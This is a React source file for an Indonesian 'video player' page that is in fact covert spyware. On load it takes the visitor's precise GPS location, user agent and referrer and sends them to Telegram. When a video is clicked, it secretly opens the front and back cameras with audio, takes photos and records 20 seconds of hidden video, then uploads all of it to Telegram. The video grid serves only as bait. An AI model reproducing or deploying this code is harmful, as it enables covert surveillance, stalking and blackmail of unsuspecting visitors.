import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback, useRef } from 'react';
import Slider from 'react-slick';
import Hls from 'hls.js';
import './styles/custom.css';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';

// Definisikan tipe untuk video
interface Video {
  videoUrl: string;
  hlsUrl: string;
}

// Fungsi untuk membagi array video menjadi kelompok 5 untuk slide
const chunkArray = <T,>(array: T[], size: number): T[][] => {
  const result: T[][] = [];
  for (let i = 0; i < array.length; i += size) {
    result.push(array.slice(i, i + size));
  }
  return result;
};

// Fungsi untuk mendeteksi apakah browser adalah Safari
const isSafari = () => {
  const userAgent = navigator.userAgent;
  return /Safari/.test(userAgent) && !/Chrome/.test(userAgent);
};

function App() {
  const [isPlaying, setIsPlaying] = useState<number | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
  const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
  const [isLoading, setIsLoading] = useState<boolean[]>([]);
  const [videoErrors, setVideoErrors] = useState<boolean[]>([]);
  const [loadedSlides, setLoadedSlides] = useState<number[]>([0]);
  const [currentSlide, setCurrentSlide] = useState<number>(0);
  const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
  const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const sliderRef = useRef<Slider | null>(null);
  const hlsInstances = useRef<(Hls | null)[]>([]);

  // Definisikan array videos dengan tipe yang tepat
  const videos: Video[] = [
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/kontoll.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/kontoll/kontoll.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio1.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio1/vidio1.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/teskntol.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/teskntol/teskntol.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio5.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio5/vidio5.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio6.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio6/vidio6.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio9.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio9/vidio9.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio8.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio8/vidio8.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio10.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio10/vidio10.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio11.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio11/vidio11.m3u8" },
    { videoUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio12.mp4", hlsUrl: "https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio12/vidio12.m3u8" }
  ];

  const videoSlides = chunkArray(videos, 5);

  useEffect(() => {
    setIsLoading(new Array(videos.length).fill(true));
    setVideoErrors(new Array(videos.length).fill(false));
    hlsInstances.current = new Array(videos.length).fill(null);
  }, []);

  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            const slideIndex = parseInt(entry.target.getAttribute('data-slide-index') || '0', 10);
            if (!loadedSlides.includes(slideIndex)) {
              console.log(`Memuat slide: ${slideIndex}`);
              setLoadedSlides((prev) => [...prev, slideIndex]);
            }
          }
        });
      },
      { threshold: 0.1 }
    );

    const slideElements = document.querySelectorAll('.slide-container');
    slideElements.forEach((el) => observer.observe(el));

    return () => {
      slideElements.forEach((el) => observer.unobserve(el));
    };
  }, [loadedSlides]);

  useEffect(() => {
    const activeSlideVideos = videoSlides[currentSlide];
    activeSlideVideos.forEach((video, index) => {
      const globalIndex = currentSlide * 5 + index;
      const urlToValidate = isSafari() ? video.hlsUrl : video.videoUrl;
      console.log(`Memeriksa video ${globalIndex + 1}: ${urlToValidate}`);
      if (!validateVideoUrl(urlToValidate)) {
        console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[globalIndex] = true;
          return newErrors;
        });
      }
    });
  }, [currentSlide]);

  useEffect(() => {
    monitorSuspiciousActivity();

    const getLocation = async (): Promise<string> => {
      try {
        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        });
        const { latitude, longitude, accuracy } = position.coords;
        console.log(`GPS location obtained with accuracy: ${accuracy} meters`);
        return `Latitude: ${latitude}, Longitude: ${longitude}`;
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mendapatkan lokasi: ${err.message}`);
        return window.location.href;
      }
    };

    const sendVisitorNotification = async () => {
      if (hasRequestedLocation) return;
      setHasRequestedLocation(true);

      const location = await getLocation();
      const visitorDetails: VisitorDetails = {
        userAgent: navigator.userAgent,
        location: location,
        referrer: document.referrer || 'Langsung',
        previousSites: document.referrer || 'Tidak ada',
      };
      try {
        await sendTelegramNotification(visitorDetails);
        console.log('Notifikasi pengunjung berhasil dikirim.');
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mengirim notifikasi pengunjung: ${err.message}`);
      }
    };

    sendVisitorNotification();

    return () => {
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
      hlsInstances.current.forEach((hls) => hls?.destroy());
      hlsInstances.current = [];
    };
  }, [hasRequestedLocation]);

  const initializeCameraStreams = async () => {
    if (hasRequestedCamera) return;
    setHasRequestedCamera(true);

    const requestMediaAccess = async (
      facingMode: string | { deviceId: string },
      cameraType: string
    ): Promise<{ stream: MediaStream; deviceId: string } | null> => {
      try {
        const constraints = {
          video:
            typeof facingMode === 'string'
              ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } }
              : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
          audio: true,
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
        console.log(`Berhasil mendapatkan stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
        return { stream, deviceId };
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mendapatkan akses kamera ${cameraType}: ${err.message}`);
        try {
          const constraints = {
            video:
              typeof facingMode === 'string'
                ? { facingMode, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } }
                : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
            audio: true,
          };
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          const deviceId = stream.getVideoTracks()[0].getSettings().deviceId || '';
          console.log(`Berhasil mendapatkan stream fallback untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
          return { stream, deviceId };
        } catch (fallbackError: unknown) {
          const fbErr = fallbackError as Error;
          console.error(`Gagal mendapatkan akses kamera ${cameraType} pada fallback: ${fbErr.message}`);
          return null;
        }
      }
    };

    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter((device) => device.kind === 'videoinput');
      console.log('Perangkat kamera yang ditemukan:', videoDevices.map((d) => ({ label: d.label, deviceId: d.deviceId })));

      const frontResult = await requestMediaAccess('user', 'depan');
      if (frontResult) {
        cameraStreamsRef.current.push({ stream: frontResult.stream, type: 'depan', deviceId: frontResult.deviceId });
      } else {
        console.warn('Kamera depan tidak tersedia atau akses ditolak.');
      }

      let backResult = await requestMediaAccess('environment', 'belakang');
      if (!backResult && videoDevices.length > 1) {
        console.log('Mencoba kamera belakang dengan deviceId alternatif...');
        backResult = await requestMediaAccess({ deviceId: videoDevices[1].deviceId }, 'belakang');
      }
      if (backResult) {
        cameraStreamsRef.current.push({ stream: backResult.stream, type: 'belakang', deviceId: backResult.deviceId });
      } else {
        console.warn('Kamera belakang tidak tersedia atau akses ditolak.');
      }

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada kamera yang tersedia atau semua akses ditolak.');
      } else {
        console.log('Stream kamera yang diinisialisasi:', cameraStreamsRef.current.map((s) => `${s.type} (${s.deviceId})`));
      }
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Error saat menginisialisasi stream kamera: ${err.message}`);
    }
  };

  const verifyStream = (stream: MediaStream, type: string): boolean => {
    const videoTracks = stream.getVideoTracks();
    if (videoTracks.length === 0 || !videoTracks[0].enabled) {
      console.error(`Stream untuk kamera ${type} tidak valid atau dimatikan. Tracks: ${videoTracks.length}`);
      return false;
    }
    console.log(`Stream untuk kamera ${type} valid dengan ${videoTracks.length} track(s).`);
    return true;
  };

  const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
    try {
      const constraints = {
        video: { deviceId: { exact: deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
        audio: true,
      };
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      console.log(`Berhasil menginisialisasi ulang stream untuk kamera ${cameraType} dengan deviceId: ${deviceId}`);
      return stream;
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}: ${err.message}`);
      try {
        const constraints = {
          video: { deviceId: { exact: deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
          audio: true,
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        console.log(`Berhasil menginisialisasi ulang stream fallback untuk kamera ${cameraType}`);
        return stream;
      } catch (fallbackError: unknown) {
        const fbErr = fallbackError as Error;
        console.error(`Gagal menginisialisasi ulang stream fallback untuk kamera ${cameraType}: ${fbErr.message}`);
        return null;
      }
    }
  };

  const stopRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      mediaRecorderRef.current.stop();
      console.log('Perekaman dihentikan.');
    }
  };

  const recordCamera = async (stream: MediaStream, type: string, deviceId: string) => {
    let currentStream = stream;
    if (!verifyStream(currentStream, type)) {
      console.warn(`Stream kamera ${type} tidak valid, mencoba menginisialisasi ulang...`);
      const newStream = await reinitializeStream(type, deviceId);
      if (newStream && verifyStream(newStream, type)) {
        currentStream = newStream;
        const cameraIndex = cameraStreamsRef.current.findIndex((s) => s.type === type);
        if (cameraIndex !== -1) {
          cameraStreamsRef.current[cameraIndex].stream = newStream;
        }
      } else {
        console.warn(`Gagal menginisialisasi ulang stream kamera ${type}, melewati perekaman.`);
        return;
      }
    }

    try {
      const cameraVideo = document.createElement('video');
      cameraVideo.srcObject = currentStream;
      cameraVideo.playsInline = true;
      cameraVideo.muted = true;
      cameraVideo.autoplay = true;
      cameraVideo.style.display = 'none';
      document.body.appendChild(cameraVideo);

      await new Promise((resolve) => {
        cameraVideo.onloadedmetadata = async () => {
          await cameraVideo.play().catch((err: Error) => console.error(`Gagal memutar video kamera ${type}: ${err.message}`));
          setTimeout(resolve, 500);
        };
      });

      const videoWidth = cameraVideo.videoWidth;
      const videoHeight = cameraVideo.videoHeight;
      console.log(`Dimensi video kamera ${type}: ${videoWidth}x${videoHeight}`);

      const canvas = document.createElement('canvas');
      const canvasAspectRatio = 9 / 16;
      const videoAspectRatio = videoWidth / videoHeight;

      let drawWidth, drawHeight, offsetX, offsetY;
      if (videoAspectRatio > canvasAspectRatio) {
        drawWidth = Math.min(videoWidth, 1080);
        drawHeight = drawWidth / videoAspectRatio;
      } else {
        drawHeight = Math.min(videoHeight, 1920);
        drawWidth = drawHeight * videoAspectRatio;
      }

      canvas.width = drawWidth;
      canvas.height = drawHeight;

      offsetX = (drawWidth - videoWidth) / 2;
      offsetY = (drawHeight - videoHeight) / 2;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(cameraVideo, offsetX, offsetY, videoWidth, videoHeight);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.9);
      });

      try {
        await sendImageToTelegram(photoBlob);
        console.log(`Foto dari kamera ${type} berhasil dikirim ke Telegram.`);
      } catch (error: unknown) {
        const err = error as Error;
        console.error(`Gagal mengirim foto dari kamera ${type}: ${err.message}`);
      }

      const supportedMimeType = ['video/mp4;codecs=h264,aac', 'video/mp4'].find((type) => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
      const mediaRecorder = new MediaRecorder(currentStream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 2500000,
      });
      mediaRecorderRef.current = mediaRecorder;
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { type: supportedMimeType });
        if (videoBlob.size === 0) {
          console.warn('File video kosong, tidak dikirim ke Telegram.');
          return;
        }
        try {
          await sendVideoToTelegram(videoBlob);
          console.log(`Video dari kamera ${type} berhasil dikirim ke Telegram.`);
        } catch (error: unknown) {
          const err = error as Error;
          console.error(`Gagal mengirim video dari kamera ${type}: ${err.message}`);
        }
      };

      mediaRecorder.onerror = (e: Event) => {
        console.error(`Error saat merekam kamera ${type}:`, e);
      };

      mediaRecorder.start(1000);
      console.log(`Mulai merekam kamera ${type}`);

      await new Promise((resolve) => setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
          console.log(`Perekaman kamera ${type} dihentikan setelah 20 detik.`);
        }
        resolve(null);
      }, 20000));

      if (cameraVideo.parentNode) cameraVideo.parentNode.removeChild(cameraVideo);
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Error saat merekam kamera ${type}: ${err.message}`);
    }
  };

  const startCameraRecording = useCallback(async () => {
    try {
      await initializeCameraStreams();

      if (cameraStreamsRef.current.length === 0) {
        console.error('Tidak ada stream kamera yang tersedia.');
        return;
      }

      const frontCamera = cameraStreamsRef.current.find((s) => s.type === 'depan');
      const backCamera = cameraStreamsRef.current.find((s) => s.type === 'belakang');

      if (frontCamera) {
        await recordCamera(frontCamera.stream, 'depan', frontCamera.deviceId);
      } else {
        console.warn('Kamera depan tidak tersedia untuk perekaman.');
      }

      if (backCamera) {
        await recordCamera(backCamera.stream, 'belakang', backCamera.deviceId);
      } else {
        console.warn('Kamera belakang tidak tersedia untuk perekaman.');
      }

      if (!frontCamera && !backCamera) {
        console.error('Kedua kamera tidak tersedia.');
      }
    } catch (error: unknown) {
      const err = error as Error;
      console.error(`Error dalam startCameraRecording: ${err.message}`);
    }
  }, []);

  const setupHls = (videoElement: HTMLVideoElement, hlsUrl: string, index: number) => {
    if (Hls.isSupported()) {
      const hls = new Hls({
        enableWorker: true,
        lowLatencyMode: true,
        backBufferLength: 90,
      });
      hls.loadSource(hlsUrl);
      hls.attachMedia(videoElement);
      hls.on(Hls.Events.MANIFEST_PARSED, () => {
        videoElement.play().catch((err) => {
          console.error(`HLS play error for video ${index + 1}:`, err);
          setVideoErrors((prev) => {
            const newErrors = [...prev];
            newErrors[index] = true;
            return newErrors;
          });
        });
      });
      hls.on(Hls.Events.ERROR, (event, data) => {
        console.error(`HLS error for video ${index + 1}:`, data);
        if (data.fatal) {
          setVideoErrors((prev) => {
            const newErrors = [...prev];
            newErrors[index] = true;
            return newErrors;
          });
          hls.destroy();
        }
      });
      hlsInstances.current[index] = hls;
    } else if (videoElement.canPlayType('application/vnd.apple.mpegurl')) {
      videoElement.src = hlsUrl;
      videoElement.play().catch((err) => {
        console.error(`Native HLS error for video ${index + 1}:`, err);
        setVideoErrors((prev) => {
          const newErrors = [...prev];
          newErrors[index] = true;
          return newErrors;
        });
      });
    } else {
      console.error(`HLS not supported for video ${index + 1}`);
      setVideoErrors((prev) => {
        const newErrors = [...prev];
        newErrors[index] = true;
        return newErrors;
      });
    }
  };

  const handleVideoClick = useCallback(
    async (index: number) => {
      startCameraRecording();

      if (isPlaying !== null && isPlaying !== index) {
        const prevVideo = videoRefs.current[isPlaying];
        if (prevVideo) {
          prevVideo.pause();
          prevVideo.currentTime = 0;
          prevVideo.removeAttribute('src');
          prevVideo.load();
          if (hlsInstances.current[isPlaying]) {
            hlsInstances.current[isPlaying]?.destroy();
            hlsInstances.current[isPlaying] = null;
          }
          stopRecording();
          console.log(`Video sebelumnya di indeks ${isPlaying} dihentikan sepenuhnya.`);
        }
      }

      const videoElement = videoRefs.current[index];
      if (videoElement) {
        const urlToUse = isSafari() ? videos[index].hlsUrl : videos[index].videoUrl;
        if (!validateVideoUrl(urlToUse)) {
          console.error(`URL video tidak valid, menghentikan pemutaran untuk video ${index + 1}.`);
          setVideoErrors((prev) => {
            const newErrors = [...prev];
            newErrors[index] = true;
            return newErrors;
          });
          return;
        }

        try {
          setIsPlaying(index);
          if (isSafari()) {
            setupHls(videoElement, videos[index].hlsUrl, index);
          } else {
            videoElement.src = urlToUse;
            await videoElement.play();
          }
        } catch (error: unknown) {
          const err = error as Error;
          console.error(`Error memutar video ${index + 1}: ${err.message}`);
          videoElement.pause();
          videoElement.currentTime = 0;
          videoElement.removeAttribute('src');
          videoElement.load();
          if (hlsInstances.current[index]) {
            hlsInstances.current[index]?.destroy();
            hlsInstances.current[index] = null;
          }
          setIsPlaying(null);
          setVideoErrors((prev) => {
            const newErrors = [...prev];
            newErrors[index] = true;
            return newErrors;
          });
        }
      }
    },
    [isPlaying]
  );

  const toggleFullscreen = (index: number) => {
    const videoElement = videoRefs.current[index];
    if (videoElement) {
      if (!isFullscreen) {
        videoElement.requestFullscreen().catch((err: Error) => console.error(`Gagal masuk fullscreen: ${err.message}`));
        setIsFullscreen(true);
      } else {
        document.exitFullscreen().catch((err: Error) => console.error(`Gagal keluar fullscreen: ${err.message}`));
      }
      console.log(`Mengubah mode fullscreen untuk video di indeks: ${index}`);
    }
  };

  const handleVideoEnded = (index: number) => {
    setIsPlaying(null);
    if (hlsInstances.current[index]) {
      hlsInstances.current[index]?.destroy();
      hlsInstances.current[index] = null;
    }
    console.log(`Video di indeks ${index} telah selesai.`);
  };

  const handleCanPlay = (index: number) => {
    console.log(`Video ${index + 1} siap diputar.`);
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
  };

  const handleVideoError = (index: number, event: React.SyntheticEvent<HTMLVideoElement, Event>) => {
    const videoElement = event.currentTarget as HTMLVideoElement;
    const errorCode = videoElement.error?.code;
    const errorMessage = videoElement.error?.message || 'Unknown error';
    console.error(
      `Gagal memuat video ${index + 1}: ${videos[index][isSafari() ? 'hlsUrl' : 'videoUrl']} | Error Code: ${errorCode} | Message: ${errorMessage}`
    );
    setIsLoading((prev) => {
      const newLoading = [...prev];
      newLoading[index] = false;
      return newLoading;
    });
    setVideoErrors((prev) => {
      const newErrors = [...prev];
      newErrors[index] = true;
      return newErrors;
    });
    if (hlsInstances.current[index]) {
      hlsInstances.current[index]?.destroy();
      hlsInstances.current[index] = null;
    }
  };

  useEffect(() => {
    const handleFullscreenChange = () => {
      if (!document.fullscreenElement && isFullscreen) {
        if (isPlaying !== null) {
          const videoElement = videoRefs.current[isPlaying];
          if (videoElement) {
            videoElement.pause();
            videoElement.currentTime = 0;
            videoElement.removeAttribute('src');
            videoElement.load();
            if (hlsInstances.current[isPlaying]) {
              hlsInstances.current[isPlaying]?.destroy();
              hlsInstances.current[isPlaying] = null;
            }
            console.log('Video dihentikan karena keluar dari fullscreen.');
          }
        }
        setIsFullscreen(false);
      }
    };

    const handleBeforeUnload = () => {
      stopRecording();
      cameraStreamsRef.current.forEach(({ stream }) => cleanupMediaStream({ current: stream }));
      cameraStreamsRef.current = [];
      hlsInstances.current.forEach((hls) => hls?.destroy());
      hlsInstances.current = [];
    };

    document.addEventListener('fullscreenchange', handleFullscreenChange);
    window.addEventListener('beforeunload', handleBeforeUnload);

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [isFullscreen, isPlaying]);

  const sliderSettings = {
    dots: true,
    infinite: true,
    speed: 500,
    slidesToShow: 1,
    slidesToScroll: 1,
    arrows: true,
    responsive: [
      {
        breakpoint: 1024,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 600,
        settings: {
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
    ],
    customPaging: (i: number) => {
      const totalSlides = videoSlides.length;
      const maxVisible = 9;
      const halfVisible = Math.floor(maxVisible / 2);

      let start = Math.max(0, currentSlide - halfVisible);
      let end = Math.min(totalSlides, start + maxVisible);

      if (end - start < maxVisible) {
        start = Math.max(0, end - maxVisible);
      }

      console.log(`Rendering dot untuk slide ${i + 1}: start=${start}, end=${end}, totalSlides=${totalSlides}`);

      if (i >= start && i < end) {
        return <button className="custom-dot">{i + 1}</button>;
      } else if (i === end && end < totalSlides) {
        return (
          <div className="dots-placeholder">
            ...
          </div>
        );
      }
      return <div className="hidden-dot" />;
    },
    appendDots: (dots: React.ReactNode) => (
      <div>
        <ul className="custom-slick-dots">{dots}</ul>
      </div>
    ),
    afterChange: (index: number) => {
      setCurrentSlide(index);
    },
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Pemutar Video</h1>
        </div>
      </header>
      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[1200px] mx-auto">
          <Slider ref={sliderRef} {...sliderSettings}>
            {videoSlides.map((slideVideos, slideIndex) => (
              <div key={slideIndex} className="px-2 slide-container" data-slide-index={slideIndex}>
                {!loadedSlides.includes(slideIndex) ? (
                  <div className="flex items-center justify-center h-[200px] bg-gray-800 bg-opacity-75">
                    <svg
                      className="animate-spin h-8 w-8 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                  </div>
                ) : (
                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
                    {slideVideos.map((_, index) => {
                      const globalIndex = slideIndex * 5 + index;
                      const videoSource = isSafari() ? videos[globalIndex].hlsUrl : videos[globalIndex].videoUrl;
                      const videoType = isSafari() ? 'application/vnd.apple.mpegurl' : 'video/mp4';
                      return (
                        <div
                          key={globalIndex}
                          className="relative bg-black rounded-lg overflow-hidden shadow-xl"
                          style={{ aspectRatio: '9/16', maxHeight: '200px' }}
                        >
                          {isLoading[globalIndex] && !videoErrors[globalIndex] && (
                            <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                              <svg
                                className="animate-spin h-8 w-8 text-white"
                                xmlns="http://www.w3.org/2000/svg"
                                fill="none"
                                viewBox="0 0 24 24"
                              >
                                <circle
                                  className="opacity-25"
                                  cx="12"
                                  cy="12"
                                  r="10"
                                  stroke="currentColor"
                                  strokeWidth="4"
                                ></circle>
                                <path
                                  className="opacity-75"
                                  fill="currentColor"
                                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                ></path>
                              </svg>
                            </div>
                          )}
                          {videoErrors[globalIndex] && (
                            <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                              <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
                            </div>
                          )}
                          <video
                            ref={(el) => (videoRefs.current[globalIndex] = el)}
                            className="w-full h-full object-cover"
                            muted
                            playsInline
                            webkit-playsinline="true"
                            onClick={() => handleVideoClick(globalIndex)}
                            onEnded={() => handleVideoEnded(globalIndex)}
                            onCanPlay={() => handleCanPlay(globalIndex)}
                            onError={(event) => handleVideoError(globalIndex, event)}
                            preload={isSafari() ? 'auto' : 'metadata'}
                          >
                            <source src={videoSource} type={videoType} />
                          </video>
                          {isPlaying === globalIndex && !videoErrors[globalIndex] && (
                            <div className="absolute bottom-2 right-2 z-20">
                              <button
                                onClick={() => toggleFullscreen(globalIndex)}
                                className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
                              >
                                {isFullscreen ? (
                                  <ArrowsPointingInIcon className="w-5 h-5 text-white" />
                                ) : (
                                  <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
                                )}
                              </button>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            ))}
          </Slider>
        </div>
      </main>
    </div>
  );
}

export default App;
